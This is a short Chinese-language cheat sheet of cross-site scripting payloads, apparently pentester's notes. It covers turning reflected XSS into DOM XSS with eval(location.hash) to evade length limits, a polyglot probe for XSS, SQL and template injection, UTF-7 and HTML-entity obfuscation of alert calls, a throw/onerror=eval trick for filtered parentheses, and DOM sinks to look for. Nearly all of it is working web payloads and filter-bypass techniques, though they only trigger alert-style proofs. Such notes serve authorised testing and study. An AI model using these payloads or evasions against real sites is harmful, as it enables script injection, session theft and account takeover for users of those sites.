### XSS的本质是HTML注入

#### FUZZ用[备忘单](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)就够了，下面的是求精。

-   XSS突破长度限制：可以将 反射型 XSS 漏洞“转换成”基于 DOM 的 XSS 漏洞

```
例如，如果易受攻击的参数称为 vuln 则可以使用以下 URL 执行任意长度的脚本：
/script.asp?vuln=<script>eval_r(location.hash.substr(1))</script>#alert('long script here ......')
```

-   自定义html标签

```
<xss id=x onfocus=print(/test/) tabindex=0> 按下Tab键触发，但要是在URL中写，可以直接用#x来聚焦
```

-   检测XSS、SQL、模板注入

```
'"><svg/onload=prompt(5);>{{7*7}}
```

-   UTF-7（IE可用）

```
+ADw-script+AD4-alert(1)+ADw-/script+AD4-
```

-   在事件属性中的HTML编码会自动HTML解码

```
<a href="#" onclick="var a = 'foo&apos;; alert(1);//';">Click</a>
```

-   括号被过滤,可以使用throw来抛出数据

```
<body/onload=javascript:window.onerror=eval;throw'=alert\x281\x29';>
```

-   DOM型挖掘，多看页面中的js脚本代码。最好用img和svg标签。关注如下方法：

```
innerHTML 
document.write
document.writeln
document.location
document.url
```

-   编码demo：

```
<img onerror=eval('al&#x5c;\u0065rt(1)') src=a>
<script>'alert(1)'.replace(/.+/,eval);</script>
<img onerror="a&#0108ert(1)"src=a>
<img/onerror="a&#x6c;ert(1)"src=a>
<iframe src=j&#x61;vasc&#x72ipt&#x3a;alert&#x28;1&#x29;>
```

